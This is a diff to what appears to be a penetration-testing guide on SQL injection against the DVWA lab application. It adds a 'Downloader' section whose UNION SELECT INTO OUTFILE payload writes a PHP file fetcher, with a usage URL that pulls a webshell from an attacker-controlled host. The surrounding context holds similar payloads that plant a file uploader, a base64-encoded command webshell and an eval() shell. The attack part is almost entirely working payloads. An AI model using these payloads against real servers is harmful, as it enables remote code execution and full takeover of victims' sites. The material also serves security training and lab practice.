@@ -311,7 +311,7 @@ SQL Query for reference.
 SELECT '<?php if(isset($_POST[\'submit\'])){$t=\'./\';$f=$t.basename($_FILES[\'fileToUpload\'][\'name\']);if(move_uploaded_file($_FILES[\'fileToUpload\'][\'tmp_name\'],$f))echo"File uploaded successfully.";else echo"Sorry, there was an error uploading your file.";}?>\n<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"><title>File Upload</title></head><body><h2>File Upload</h2><form action=\"<?=$_SERVER[\'PHP_SELF\']?>\" method=\"POST\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"fileToUpload\" id=\"fileToUpload\"><input type=\"submit\" value=\"Upload\" name=\"submit\"></form></body></html>' INTO OUTFILE '/path/to/uploader.php'
 ```
 
-Convert it to SQLi exploit with **UNION SELECT**.
+Convert it to SQLi injection exploit with **UNION SELECT**.
 
 ```sql
 ' UNION SELECT '<?php if(isset($_POST[\'submit\'])){$t=\'./\';$f=$t.basename($_FILES[\'fileToUpload\'][\'name\']);if(move_uploaded_file($_FILES[\'fileToUpload\'][\'tmp_name\'],$f))echo"File uploaded successfully.";else echo"Sorry, there was an error uploading your file.";}?>\n<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"><title>File Upload</title></head><body><h2>File Upload</h2><form action=\"<?=$_SERVER[\'PHP_SELF\']?>\" method=\"POST\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"fileToUpload\" id=\"fileToUpload\"><input type=\"submit\" value=\"Upload\" name=\"submit\"></form></body></html>', NULL INTO OUTFILE '/var/www/html/dvwa/uploader.php'#
@@ -330,7 +330,27 @@ PD9waHAgJGNtZD0kX0dFVFsiY21kIl07c3lzdGVtKCRjbWQpOz8+Cg==
 ' UNION SELECT FROM_BASE64("PD9waHAgJGNtZD0kX0dFVFsiY21kIl07c3lzdGVtKCRjbWQpOz8+Cg=="), NULL INTO OUTFILE '/var/www/html/dvwa/shell.php'#
 ```
 
-##### 4.2.5.1.3 - Evaluate PHP Code
+##### 4.2.5.1.3 - Downloader
+
+SQL Query for reference.
+
+```sql
+SELECT '<?php fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/html/downloader.php'
+```
+
+Convert it to SQL injection exploit with **UNION SELECT**.
+
+```sql
+' UNION SELECT '<?php fwrite(fopen($_GET[file], \'w\'), file_get_contents($_GET[url])); ?>' INTO OUTFILE '/var/www/html/downloader.php'
+```
+
+Usage example to download an external webshell via attacker URL.
+
+```
+http://dvwa.local/dvwa/downloader.php?file=error.php&url=http[s]://<attacker_IP>/shell.php
+```
+
+##### 4.2.5.1.4 - Evaluate PHP Code
 
 ```php
 <?php eval($_GET[evaluate]); ?>
@@ -342,14 +362,16 @@ SQL Query for reference.
 SELECT '<?php eval($_GET[evaluate]); ?>', NULL INTO OUTFILE '/var/www/html/dvwa/eval_php.php'
 ```
 
-Convert it to SQLi exploit with **UNION SELECT**.
+Convert it to SQL injection exploit with **UNION SELECT**.
 
 ```sql
 ' UNION SELECT '<?php eval($_GET[evaluate]); ?>', NULL INTO OUTFILE '/var/www/html/dvwa/eval_php.php'#
 ```
 
+An example usage to enumerate PHP backend server side.
+
 ```
-"http://dvwa.local/dvwa/eval_php.php?evaluate=phpinfo()"
+http://dvwa.local/dvwa/eval_php.php?evaluate=phpinfo()
 ```
 
 `<insert screenshots>`
@@ -357,7 +379,7 @@ Convert it to SQLi exploit with **UNION SELECT**.
 - **Base64 encoded**
 
 ```
-"http://dvwa.local/dvwa/eval_php.php?evaluate=if(file_put_contents('webshell.php', base64_decode(<base64_encoded>))){ echo 1;} else {echo 2;}"
+http://dvwa.local/dvwa/eval_php.php?evaluate=if(file_put_contents('webshell.php', base64_decode(<base64_encoded>))){ echo 1;} else {echo 2;}
 ```
 
 ##### 4.2.5.1.4 - NTLM Hashes (Out-of-band) via Authenticated SMB Relay
